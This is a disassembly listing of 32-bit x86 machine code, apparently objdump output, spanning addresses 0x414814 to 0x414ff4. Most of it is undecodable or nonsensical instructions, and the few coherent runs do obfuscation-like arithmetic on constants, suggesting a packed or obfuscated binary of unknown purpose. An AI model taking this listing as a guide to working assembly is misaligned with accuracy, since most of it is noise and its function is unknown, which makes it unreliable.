  414814:	imul   ecx,ecx,0x59
  414817:	dec    esp
  414818:	jmp    FWORD PTR [ebp+0x1e0ffe52]
  41481e:	into   
  41481f:	loopne 0x4147ad
  414821:	out    0x72,eax
  414823:	test   ebp,ebp
  414825:	and    ecx,ebp
  414827:	rol    edi,cl
  414829:	pop    eax
  41482a:	sbb    ch,dh
  41482c:	repz js 0x4147bc
  41482f:	adc    BYTE PTR [ebx-0x3290be9f],ch
  414835:	inc    eax
  414836:	lods   eax,DWORD PTR ds:[esi]
  414837:	ins    DWORD PTR es:[edi],dx
  414838:	sub    bh,BYTE PTR [edx+0x67]
  41483b:	xor    BYTE PTR [eax-0x64],bl
  41483e:	sub    edx,eax
  414840:	pop    eax
  414841:	push   es
  414842:	jne    0x4148aa
  414844:	push   ss
  414845:	outs   dx,DWORD PTR ds:[esi]
  414846:	dec    DWORD PTR [esi+eax*8]
  414849:	repz das 
  41484b:	imul   esp
  41484d:	jecxz  0x414886
  41484f:	and    dh,BYTE PTR [ebp-0x78]
  414852:	sbb    DWORD PTR [ebp-0x23],edi
  414855:	pop    esi
  414856:	fist   WORD PTR [eax-0x27490ab6]
  41485c:	ret    
  41485d:	ret    
  41485e:	sbb    BYTE PTR [esi-0x43],ah
  414861:	mov    edi,0xbf7b2818
  414866:	pop    edx
  414867:	mov    ds:0x7bd414c,eax
  41486c:	sub    eax,0xa97ee12a
  414871:	cwde   
  414872:	ja     0x4148e6
  414874:	inc    esi
  414875:	(bad)  
  414876:	lods   al,BYTE PTR ds:[esi]
  414877:	sub    edx,ecx
  414879:	pop    ss
  41487a:	bound  edx,QWORD PTR [edi]
  41487c:	shr    BYTE PTR [eax+0x15],0x7c
  414880:	jecxz  0x41488d
  414882:	fs call 0xedc55a13
  414888:	adc    al,0x9c
  41488a:	ror    BYTE PTR [esi+esi*4+0x3458534f],1
  414891:	push   es
  414892:	dec    eax
  414893:	jge    0x41485b
  414895:	mov    al,ds:0x708c25ee
  41489a:	pop    es
  41489b:	mov    eax,0x9ee9daff
  4148a0:	rcl    dl,1
  4148a2:	leave  
  4148a3:	fnstsw WORD PTR [esi]
  4148a5:	adc    dl,BYTE PTR [edx]
  4148a7:	push   0x65
  4148a9:	(bad)  
  4148aa:	stos   BYTE PTR es:[edi],al
  4148ab:	jmp    0x6401833
  4148b0:	xchg   BYTE PTR [ecx-0x76],ch
  4148b3:	sub    DWORD PTR ds:0x14e845e2,0xe8257c5f
  4148bd:	adc    BYTE PTR [esi],dh
  4148bf:	enter  0xbfab,0x30
  4148c3:	pop    esp
  4148c4:	cwde   
  4148c5:	not    DWORD PTR [edx+0x411bac88]
  4148cb:	mov    ecx,0x710cb131
  4148d0:	xor    BYTE PTR ds:0x18045fec,ah
  4148d6:	push   ebp
  4148d7:	stc    
  4148d8:	xor    esp,DWORD PTR [ecx+0x773c3bd5]
  4148de:	(bad)  
  4148e0:	loopne 0x41494f
  4148e2:	pop    esi
  4148e3:	sub    eax,0xe292a2a1
  4148e8:	sbb    DWORD PTR [esi-0x273f9136],ebx
  4148ee:	dec    eax
  4148ef:	popa   
  4148f0:	das    
  4148f1:	mov    esi,0xd99fe244
  4148f6:	addr16 adc edi,eax
  4148f9:	and    edx,edi
  4148fb:	stc    
  4148fc:	cwde   
  4148fd:	(bad)  
  4148fe:	enter  0xe647,0xcf
  414902:	cwde   
  414903:	shr    DWORD PTR [edi+eax*1+0x27f22b01],1
  41490a:	xchg   edx,eax
  41490b:	ss push esi
  41490d:	enter  0x2d75,0x1a
  414911:	out    0xfd,al
  414913:	jb     0x414896
  414915:	(bad)  
  414916:	repz sub ax,0x580d
  41491b:	ror    ebp,1
  41491d:	fsub   DWORD PTR [ebx+0x1e]
  414920:	das    
  414921:	lsl    edx,WORD PTR [ecx+esi*8-0xa]
  414926:	retf   
  414927:	mov    esp,0x4cc87916
  41492c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41492d:	shl    BYTE PTR [edi+0x72],0x78
  414931:	sub    ecx,DWORD PTR [ebx]
  414933:	dec    ecx
  414934:	push   esp
  414935:	jecxz  0x414904
  414937:	pop    ss
  414938:	add    edi,DWORD PTR [ebx]
  41493a:	in     al,0x7b
  41493c:	pop    ebp
  41493d:	outs   dx,DWORD PTR ds:[esi]
  41493e:	rcr    esi,0x61
  414941:	push   ss
  414942:	test   BYTE PTR [esi-0x79457f09],bh
  414948:	mov    ecx,DWORD PTR [ebp-0x4]
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0xffffffaf
  414996:	jmp    0x1ccd07c6
  41499b:	sbb    BYTE PTR [eax],bl
  41499d:	rcl    BYTE PTR [edx],1
  41499f:	sbb    BYTE PTR [eax],bl
  4149a1:	sub    DWORD PTR [esp+eiz*2],ebx
  4149a4:	idiv   BYTE PTR [edi+0x4d1455a5]
  4149aa:	iret   
  4149ab:	jno    0x414980
  4149ad:	and    ch,BYTE PTR [ebx+0x24]
  4149b0:	outs   dx,DWORD PTR ds:[esi]
  4149b1:	jae    0x414997
  4149b3:	push   ebx
  4149b4:	xor    DWORD PTR [ecx+0x5b],edx
  4149b7:	mov    ds:0xf70a3042,al
  4149bc:	mov    es,WORD PTR [edi+0x73]
  4149bf:	pop    esi
  4149c0:	fdiv   DWORD PTR [ecx+ebx*4+0x32]
  4149c4:	ret    
  4149c5:	inc    esp
  4149c6:	or     al,0x79
  4149c8:	loope  0x4149c1
  4149ca:	(bad)  
  4149cb:	mov    ah,0xaa
  4149cd:	mov    al,0xe5
  4149cf:	shl    BYTE PTR ds:0xbe9b16b1,1
  4149d5:	pushf  
  4149d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149d7:	push   ds
  4149d8:	stos   BYTE PTR es:[edi],al
  4149d9:	jns    0x414a17
  4149db:	xor    ah,BYTE PTR cs:[edx-0x49]
  4149df:	mov    dh,0xf8
  4149e1:	xor    ebp,edi
  4149e3:	lds    edi,FWORD PTR ds:0xb0a4ed5c
  4149e9:	cmp    BYTE PTR [ebp-0x73],dl
  4149ec:	int    0x85
  4149ee:	ins    DWORD PTR es:[edi],dx
  4149ef:	rcl    BYTE PTR [eax-0x7a],cl
  4149f2:	in     eax,0x73
  4149f4:	add    BYTE PTR [ebx+0x12],ah
  4149f7:	mov    bl,0x75
  4149f9:	std    
  4149fa:	adc    al,0xb6
  4149fc:	push   eax
  4149fd:	or     eax,0x85df877
  414a02:	enter  0x62d3,0x15
  414a06:	mov    ch,0xfa
  414a08:	push   ecx
  414a09:	xor    eax,0x7aa3be28
  414a0e:	or     al,bl
  414a10:	test   al,0x38
  414a12:	sub    DWORD PTR [edx-0x74],esi
  414a15:	jbe    0x4149f1
  414a17:	bnd jno 0x4149d5
  414a1a:	sbb    eax,0xfa46bce8
  414a1f:	push   ds
  414a20:	inc    eax
  414a21:	jno    0x86c63b10
  414a27:	cmp    esi,esi
  414a29:	ss add eax,0x1315c69f
  414a2f:	fmul   DWORD PTR [edi+0x1d12ca38]
  414a35:	call   0x689f3804
  414a3a:	ror    esi,cl
  414a3c:	test   BYTE PTR ss:[ecx],0xf9
  414a40:	xchg   dl,dh
  414a42:	(bad)  
  414a43:	jmp    0x414a98
  414a45:	adc    BYTE PTR [ecx],dl
  414a47:	jmp    0x74bbc234
  414a4c:	fdiv   st,st(5)
  414a4e:	into   
  414a4f:	frstor ss:[ebp+0x4b]
  414a53:	xchg   esi,eax
  414a54:	mov    edi,fs
  414a56:	fwait
  414a57:	mov    al,0x61
  414a59:	cs loopne 0x414aad
  414a5c:	jae    0x414aa9
  414a5e:	aam    0x2e
  414a60:	mov    ecx,0xc6a1f3cf
  414a65:	inc    ecx
  414a66:	mov    ch,0xe3
  414a68:	xchg   esp,eax
  414a69:	jmp    0x9f178419
  414a6e:	jl     0x4149ff
  414a70:	mov    edi,0x8a6abb8e
  414a75:	fisub  DWORD PTR ds:0x2089edf9
  414a7b:	xchg   esp,eax
  414a7c:	out    dx,al
  414a7d:	stc    
  414a7e:	stos   DWORD PTR es:[edi],eax
  414a7f:	mov    bl,0xc2
  414a81:	jnp    0x414a10
  414a83:	mov    al,ds:0x1545af36
  414a88:	cli    
  414a89:	adc    BYTE PTR ds:[ebx+0x24db0a4e],0xbc
  414a91:	(bad)  
  414a92:	ss sub al,0x33
  414a95:	sahf   
  414a96:	scas   eax,DWORD PTR es:[edi]
  414a97:	fsub   st,st(1)
  414a99:	fsubr  DWORD PTR [edx]
  414a9b:	int3   
  414a9c:	leave  
  414a9d:	js     0x414ac6
  414a9f:	mov    bh,BYTE PTR [edx]
  414aa1:	sahf   
  414aa2:	into   
  414aa3:	jbe    0x414a42
  414aa5:	(bad)  
  414aa6:	bound  esi,QWORD PTR ds:0x1806755f
  414aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aad:	pop    ss
  414aae:	sub    al,0xb9
  414ab0:	and    BYTE PTR [edx],ch
  414ab2:	pop    edi
  414ab3:	push   0xffffffc1
  414ab5:	test   al,0x4e
  414ab7:	shl    DWORD PTR [ecx+0x73],1
  414aba:	pop    eax
  414abb:	jp     0x414ac0
  414abd:	dec    eax
  414abe:	sub    ecx,DWORD PTR [ecx]
  414ac0:	aam    0xe1
  414ac2:	mov    dl,0x5d
  414ac4:	inc    esp
  414ac5:	(bad)  
  414ac6:	mov    al,0x55
  414ac8:	xchg   DWORD PTR [eax+0x46514bce],ebx
  414ace:	dec    edx
  414acf:	test   DWORD PTR [edi+0x2c4ee42d],ebx
  414ad5:	das    
  414ad6:	pop    es
  414ad7:	inc    ecx
  414ad8:	daa    
  414ad9:	lock dec ebp
  414adb:	stos   DWORD PTR es:[edi],eax
  414adc:	stos   DWORD PTR es:[edi],eax
  414add:	jg     0x414b13
  414adf:	mov    eax,ds:0x4cf304f6
  414ae4:	std    
  414ae5:	mov    ecx,0xa5a59b01
  414aea:	mov    ?,WORD PTR [ebp*8+0x3b88fbde]
  414af1:	retf   0x7003
  414af4:	sti    
  414af5:	outs   dx,DWORD PTR ds:[esi]
  414af6:	out    0x9b,al
  414af8:	scas   al,BYTE PTR es:[edi]
  414af9:	pop    ds
  414afa:	out    dx,eax
  414afb:	inc    eax
  414afc:	sub    BYTE PTR [ecx+ebx*1-0x4c161947],0x35
  414b04:	mov    eax,0x6002396d
  414b09:	adc    edx,ebx
  414b0b:	dec    ebx
  414b0c:	hlt    
  414b0d:	xrstors [ecx]
  414b10:	int    0x61
  414b12:	add    cl,cl
  414b14:	enter  0x398,0xa1
  414b18:	shr    BYTE PTR [esi],1
  414b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b1b:	pop    es
  414b1c:	jg     0x414ae3
  414b1e:	and    bh,BYTE PTR [edx-0x6d87a61f]
  414b24:	xor    ch,bh
  414b26:	dec    ecx
  414b27:	jae    0x414b68
  414b29:	bound  esp,QWORD PTR [ecx+0x50d317f7]
  414b2f:	push   ebp
  414b30:	push   es
  414b31:	sub    BYTE PTR [eax],ch
  414b33:	dec    ebp
  414b34:	out    0xdf,al
  414b36:	mov    ecx,0x7f7d6ad3
  414b3b:	mov    ebx,0xf1a40ba8
  414b40:	sti    
  414b41:	xchg   cl,dl
  414b43:	push   0x16
  414b45:	sbb    DWORD PTR [eax],0x50
  414b48:	sbb    al,BYTE PTR [esi+0x69e7919c]
  414b4e:	out    dx,al
  414b4f:	into   
  414b50:	inc    eax
  414b51:	les    ebx,FWORD PTR [ebx-0x3f8f9d47]
  414b57:	xchg   edi,eax
  414b58:	dec    ebx
  414b59:	and    ah,al
  414b5b:	fist   WORD PTR [esi+0x19]
  414b5e:	and    BYTE PTR [edx],0x57
  414b61:	addr16 pushf 
  414b63:	dec    ecx
  414b64:	adc    dl,BYTE PTR [esi-0x6c]
  414b67:	gs sbb eax,0x782b247
  414b6d:	in     al,0x94
  414b6f:	pop    es
  414b70:	test   DWORD PTR [eax],esi
  414b72:	mov    ecx,0x255e1a84
  414b77:	xchg   edx,eax
  414b78:	lahf   
  414b79:	repnz or BYTE PTR [edx-0x5a3b256b],dh
  414b80:	mov    esp,edx
  414b82:	iret   
  414b83:	sbb    eax,0xf2ae8012
  414b88:	jne    0x414b28
  414b8a:	cmp    al,0x97
  414b8c:	xor    DWORD PTR [esi+0x12],ebp
  414b8f:	add    al,0x98
  414b91:	int3   
  414b92:	inc    ecx
  414b93:	adc    DWORD PTR [ebx-0x43],esi
  414b96:	ss jbe 0x414b2e
  414b99:	lea    edi,[ebp+esi*4-0x328d17e1]
  414ba0:	sub    DWORD PTR [esp+eax*1-0x91772be],edx
  414ba7:	or     ebp,DWORD PTR [edx-0x69]
  414baa:	gs ss cdq 
  414bad:	(bad)  
  414bae:	sub    eax,0xcce5396c
  414bb3:	pop    edx
  414bb4:	xor    al,0xd9
  414bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb7:	je     0x414bd0
  414bb9:	test   DWORD PTR [ebp+0x123549e5],edx
  414bbf:	mov    dh,0x27
  414bc1:	and    eax,0x930b7dd3
  414bc6:	xchg   ecx,eax
  414bc7:	enter  0xfd91,0x92
  414bcb:	jge    0x414bf0
  414bcd:	bound  ebx,QWORD PTR [edx+edx*2-0x1a]
  414bd1:	loopne 0x414bc0
  414bd3:	stos   BYTE PTR es:[edi],al
  414bd4:	loopne 0x414b92
  414bd6:	scas   al,BYTE PTR es:[edi]
  414bd7:	jns    0x414c1b
  414bd9:	adc    eax,DWORD PTR [ecx+0x1d]
  414bdc:	mov    ah,0x77
  414bde:	adc    edi,edi
  414be0:	mov    al,ds:0x79f20aa4
  414be5:	jg     0x414b7b
  414be7:	cld    
  414be8:	fidiv  DWORD PTR [ecx+0x6785930f]
  414bee:	cmp    DWORD PTR [eax],edi
  414bf0:	and    bh,BYTE PTR [ebp-0xb4ebe42]
  414bf6:	mov    ds:0x2dda4998,eax
  414bfb:	(bad)  
  414bfc:	inc    esi
  414bfd:	callw  0xbb8b
  414c01:	out    dx,al
  414c02:	cmp    al,0x4a
  414c04:	mov    edx,0x7426f07d
  414c09:	pusha  
  414c0a:	sbb    al,0x14
  414c0c:	jb     0x414c43
  414c0e:	sbb    bl,BYTE PTR [ecx+0x39]
  414c11:	jno    0x414bcc
  414c13:	(bad)  
  414c14:	out    dx,eax
  414c15:	jb     0x414c5f
  414c17:	ret    0x8099
  414c1a:	xchg   ebp,eax
  414c1b:	aad    0x51
  414c1d:	cmp    BYTE PTR [ebx],cl
  414c1f:	jp     0x414c42
  414c21:	adc    al,0xa2
  414c23:	sbb    ebx,DWORD PTR [eax-0x77]
  414c26:	outs   dx,BYTE PTR ds:[esi]
  414c27:	loope  0x414c14
  414c29:	mov    ecx,0x3314fbc2
  414c2e:	(bad)  
  414c2f:	cs push 0x93bd8d8a
  414c35:	xchg   esp,eax
  414c36:	out    dx,al
  414c37:	pop    ebp
  414c38:	xchg   eax,ebx
  414c3a:	pop    edi
  414c3b:	in     al,dx
  414c3c:	fwait
  414c3d:	or     eax,0xa499d1f7
  414c42:	mov    eax,0x7bc005f3
  414c47:	xchg   edx,eax
  414c48:	gs jmp 0x414c0a
  414c4b:	mov    esi,0x57c58d5c
  414c50:	pop    ss
  414c51:	jg     0x414bd8
  414c53:	inc    eax
  414c54:	cmp    edx,eax
  414c56:	jle    0x414c41
  414c58:	jp     0x414c9e
  414c5a:	add    al,0x3c
  414c5d:	fist   WORD PTR [esi]
  414c5f:	rcr    BYTE PTR [edx+0x4d],0x6d
  414c63:	jl     0x414c68
  414c65:	cwde   
  414c66:	out    0x9e,al
  414c68:	sub    ecx,DWORD PTR [ebx+0x5e]
  414c6b:	rcl    DWORD PTR [ecx-0x55],1
  414c6e:	ins    DWORD PTR es:[edi],dx
  414c6f:	daa    
  414c70:	test   eax,0x9a23ee74
  414c75:	mov    cl,0x3
  414c77:	nop
  414c78:	shr    DWORD PTR [ecx],1
  414c7a:	mov    ebp,0xed947ae7
  414c7f:	fisttp QWORD PTR [edi-0x656c1186]
  414c85:	aaa    
  414c86:	jecxz  0x414c50
  414c88:	cmp    BYTE PTR cs:[ebp-0x54],0xd
  414c8d:	mov    cl,0x38
  414c8f:	cvtpi2ps xmm3,QWORD PTR [ecx+ebp*1-0x30]
  414c94:	std    
  414c95:	mov    eax,0x173cf338
  414c9a:	or     al,BYTE PTR [edx-0x53]
  414c9d:	adc    bl,BYTE PTR [ecx]
  414c9f:	retf   0x7815
  414ca2:	mov    eax,ds:0xccd4963e
  414ca7:	xchg   DWORD PTR [ebp+0x2e],edx
  414caa:	test   esp,ebx
  414cac:	ins    DWORD PTR es:[edi],dx
  414cad:	lahf   
  414cae:	call   0xb932:0x3e9249ee
  414cb5:	ret    
  414cb6:	jb     0x414c77
  414cb8:	std    
  414cb9:	fadd   DWORD PTR fs:[eax]
  414cbc:	and    esi,DWORD PTR [edi+eax*8+0x5c9f330f]
  414cc3:	ja     0x414d31
  414cc5:	dec    edi
  414cc6:	leave  
  414cc7:	jp     0x414c78
  414cc9:	ds aam 0xa3
  414ccc:	test   eax,0x803a6f6a
  414cd1:	adc    ebx,esi
  414cd3:	sub    DWORD PTR [esi-0x5e],0x27
  414cd7:	cs jl  0x414d43
  414cda:	aam    0x6f
  414cdc:	sbb    al,0x7d
  414cde:	dec    eax
  414cdf:	xchg   ebp,eax
  414ce0:	out    dx,al
  414ce1:	hlt    
  414ce2:	enter  0xbf4e,0x9e
  414ce6:	stc    
  414ce7:	stos   DWORD PTR es:[edi],eax
  414ce8:	stos   DWORD PTR es:[edi],eax
  414ce9:	jle    0x414d4c
  414ceb:	push   ss
  414cec:	bound  ecx,QWORD PTR [esi-0x8b3f127]
  414cf2:	inc    esp
  414cf3:	test   al,0xbe
  414cf5:	nop    edi
  414cf8:	lock cmp ah,dl
  414cfb:	test   BYTE PTR [ecx+0x9ba0249],al
  414d01:	and    eax,0x971fc7a0
  414d06:	ror    DWORD PTR [ecx-0xd],1
  414d09:	sbb    al,0x5
  414d0b:	push   ds
  414d0c:	out    dx,al
  414d0d:	jne    0x414cbf
  414d0f:	aas    
  414d10:	pop    esp
  414d11:	in     al,0x35
  414d13:	mov    esi,esi
  414d15:	or     DWORD PTR [ebp-0x65],ebp
  414d18:	lods   eax,DWORD PTR ds:[esi]
  414d19:	adc    ecx,DWORD PTR [edx]
  414d1b:	in     eax,dx
  414d1c:	cwde   
  414d1d:	arpl   WORD PTR [eax-0x64765855],bp
  414d23:	dec    esi
  414d24:	lds    ebp,FWORD PTR [esi-0x73]
  414d27:	inc    eax
  414d28:	pop    ds
  414d29:	std    
  414d2a:	jmp    0x2dee:0x3236c283
  414d31:	fcom   QWORD PTR [esi+0x4defa2d0]
  414d37:	xchg   ebx,eax
  414d38:	pop    es
  414d39:	sub    ah,BYTE PTR [esi+0x6f68393]
  414d3f:	mov    ch,0xce
  414d41:	test   BYTE PTR [ebx],dl
  414d43:	cli    
  414d44:	cmp    BYTE PTR [edx],ah
  414d46:	xor    eax,0xc1034729
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0x72
  414e02:	popa   
  414e03:	jge    0x414db5
  414e05:	inc    edx
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx+0x58181812],dl
  414e0e:	ds fwait
  414e10:	das    
  414e11:	add    eax,eax
  414e13:	xchg   ebp,eax
  414e14:	or     eax,0xe0451170
  414e19:	xchg   ecx,eax
  414e1a:	(bad)  
  414e1b:	and    BYTE PTR [eax],dl
  414e1d:	dec    eax
  414e1e:	mov    al,ds:0x14e592c2
  414e23:	xchg   ecx,eax
  414e24:	xor    ah,bl
  414e26:	fdiv   DWORD PTR [eax-0x29]
  414e29:	leave  
  414e2a:	int    0x11
  414e2c:	scas   al,BYTE PTR es:[edi]
  414e2d:	retf   0x22c9
  414e30:	inc    ebx
  414e32:	xchg   ecx,eax
  414e33:	ins    BYTE PTR es:[edi],dx
  414e34:	jbe    0x414dfd
  414e36:	inc    eax
  414e37:	xchg   ebx,eax
  414e38:	or     dx,0xe729
  414e3d:	aad    0x9f
  414e3f:	sbb    eax,0x55609061
  414e44:	sar    DWORD PTR [edi],cl
  414e46:	add    BYTE PTR [ebx-0x31],bl
  414e49:	sub    BYTE PTR [ebx-0x43],ah
  414e4c:	mov    edi,0xd504bb95
  414e51:	cmp    ch,BYTE PTR [ebx]
  414e53:	je     0x414e1e
  414e55:	mov    ecx,0x23062813
  414e5a:	jns    0x414e68
  414e5c:	sahf   
  414e5d:	fsub   st,st(1)
  414e5f:	in     al,dx
  414e60:	mov    bh,BYTE PTR [edi+0x2e1bb064]
  414e66:	repnz pop esi
  414e68:	xor    eax,0xa73eef4a
  414e6d:	push   es
  414e6e:	mov    eax,ds:0xc34d16b5
  414e73:	out    dx,al
  414e74:	xchg   BYTE PTR [esi],bh
  414e76:	and    eax,0x68b4895
  414e7b:	mov    edx,0x5bef2b96
  414e80:	es sbb al,0x75
  414e83:	shl    edx,cl
  414e85:	lock cmp al,0xe4
  414e88:	or     al,0xa5
  414e8a:	dec    eax
  414e8b:	xchg   ebx,eax
  414e8c:	mov    dl,0x45
  414e8e:	inc    ecx
  414e8f:	inc    edx
  414e90:	cld    
  414e91:	(bad)  
  414e92:	xchg   esp,eax
  414e93:	repz lahf 
  414e95:	jno    0x414e55
  414e97:	cmp    dh,BYTE PTR cs:[ecx-0x6cb3d3e]
  414e9e:	dec    ebp
  414e9f:	pop    esi
  414ea0:	lea    ebp,[eax-0x16bcd856]
  414ea6:	mov    eax,0xfb52bbed
  414eab:	mov    esi,ebx
  414ead:	test   BYTE PTR [edi-0x15],ch
  414eb0:	jmp    0x414f27
  414eb2:	mov    gs,esp
  414eb4:	dec    ecx
  414eb5:	adc    ecx,esi
  414eb7:	jnp    0x414e9d
  414eb9:	retf   0x3a66
  414ebc:	std    
  414ebd:	sbb    esi,DWORD PTR [esi+ebp*2+0x26]
  414ec1:	call   DWORD PTR [eax+0x0]
  414ec4:	xchg   BYTE PTR [edi-0x5b],bl
  414ec7:	push   ecx
  414ec8:	and    DWORD PTR [edx+eiz*2],ecx
  414ecb:	add    dl,BYTE PTR [ecx+0x14590d45]
  414ed1:	(bad)  
  414ed2:	cli    
  414ed3:	lds    ecx,FWORD PTR [eax+0x4c]
  414ed6:	(bad)  
  414ed7:	loop   0x414efe
  414ed9:	lods   al,BYTE PTR ds:[esi]
  414eda:	push   cs
  414edb:	inc    ecx
  414edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414edd:	aad    0x8d
  414edf:	jecxz  0x414ef7
  414ee1:	ins    DWORD PTR es:[edi],dx
  414ee2:	in     al,0xb2
  414ee4:	cmc    
  414ee5:	push   ecx
  414ee6:	out    0x35,eax
  414ee8:	lahf   
  414ee9:	mov    esp,0x781f3e1
  414eee:	mov    WORD PTR [edi],?
  414ef0:	mov    bl,0xd7
  414ef2:	pop    edx
  414ef3:	addr16 repnz inc ebp
  414ef6:	aaa    
  414ef7:	xlat   BYTE PTR ds:[ebx]
  414ef8:	loop   0x414e7d
  414efa:	push   ss
  414efb:	lds    ecx,FWORD PTR [esi+0x6]
  414efe:	mov    ebp,0xb03cb40c
  414f03:	mov    ecx,0xca1f9e1b
  414f08:	jmp    0xa6b1c6a1
  414f0d:	pop    ecx
  414f0e:	add    DWORD PTR [ecx-0x5d4c8375],esi
  414f14:	ins    DWORD PTR es:[edi],dx
  414f15:	enter  0x6b82,0x98
  414f19:	xchg   BYTE PTR [edx-0x3cee93c2],ah
  414f1f:	es (bad) 
  414f21:	dec    edx
  414f22:	std    
  414f23:	sub    eax,0xeded0049
  414f28:	mov    ecx,edx
  414f2a:	adc    BYTE PTR [ecx],bl
  414f2c:	xchg   edx,eax
  414f2d:	out    0x68,al
  414f2f:	mov    BYTE PTR ds:0x4c6ca4fd,cl
  414f35:	clc    
  414f36:	or     eax,0x57f9df0a
  414f3b:	adc    eax,0xb3892191
  414f40:	push   ds
  414f41:	sbb    DWORD PTR [eax],esp
  414f43:	xchg   DWORD PTR [edx],esp
  414f45:	xchg   esp,eax
  414f46:	cmp    edi,DWORD PTR [ebp-0x83506e9]
  414f4c:	fbld   TBYTE PTR [edx+0x39]
  414f4f:	in     al,dx
  414f50:	scas   eax,DWORD PTR es:[edi]
  414f51:	enter  0xd058,0x76
  414f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f56:	xchg   ecx,eax
  414f57:	scas   eax,DWORD PTR es:[edi]
  414f58:	js     0x414f5c
  414f5a:	ss dec esi
  414f5c:	cmp    dl,BYTE PTR [edx+0x41fa6211]
  414f62:	add    BYTE PTR ds:0xeb197a9e,dl
  414f68:	cld    
  414f69:	cmp    eax,0x99950038
  414f6e:	hlt    
  414f6f:	mov    edi,0x9babc1b9
  414f74:	jnp    0x414f0c
  414f76:	je     0x414f65
  414f78:	int3   
  414f79:	xchg   esi,eax
  414f7a:	and    dl,BYTE PTR [ebx+0x318c7358]
  414f80:	ins    BYTE PTR es:[edi],dx
  414f81:	adc    eax,0xc09ca92
  414f86:	mov    al,0xb3
  414f88:	cmp    al,cl
  414f8a:	test   BYTE PTR [ebx+ebx*4],0x2
  414f8e:	sub    DWORD PTR [ecx-0x2f3ebc16],0x4e
  414f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f96:	aas    
  414f97:	sbb    al,0x25
  414f99:	or     BYTE PTR [ebx+esi*2-0x69e859cb],ch
  414fa0:	sbb    esi,DWORD PTR [ecx+0x2022d72c]
  414fa6:	call   0xc737b304
  414fab:	popa   
  414fac:	ins    DWORD PTR es:[edi],dx
  414fad:	cmp    BYTE PTR gs:[ebx+0x7167f99f],bl
  414fb4:	ret    0x74dd
  414fb7:	aad    0xfc
  414fb9:	jge    0x414f98
  414fbb:	bound  ebx,QWORD PTR [edi+0x54]
  414fbe:	loop   0x414fd2
  414fc0:	stc    
  414fc1:	add    dl,BYTE PTR [ebx+0x1f]
  414fc4:	jno    0x414ffe
  414fc6:	sti    
  414fc7:	jb     0x414fc2
  414fc9:	arpl   WORD PTR [ecx-0x39926014],di
  414fcf:	(bad)  
  414fd0:	lods   eax,DWORD PTR ds:[esi]
  414fd1:	outs   dx,DWORD PTR ds:[esi]
  414fd2:	push   esi
  414fd3:	dec    edi
  414fd4:	retf   0x4234
  414fd7:	stos   BYTE PTR es:[edi],al
  414fd8:	ds jmp 0x7c802794
  414fde:	sub    edx,DWORD PTR [edx]
  414fe0:	or     ecx,edx
  414fe2:	ret    0x88ce
  414fe5:	loope  0x414fb6
  414fe7:	push   0x1d
  414fe9:	inc    eax
  414fea:	and    bl,BYTE PTR [ebp+eax*1-0x2f6cae83]
  414ff1:	into   
  414ff2:	inc    esi
  414ff3:	in     al,dx
  414ff4:	jmp    0x415039
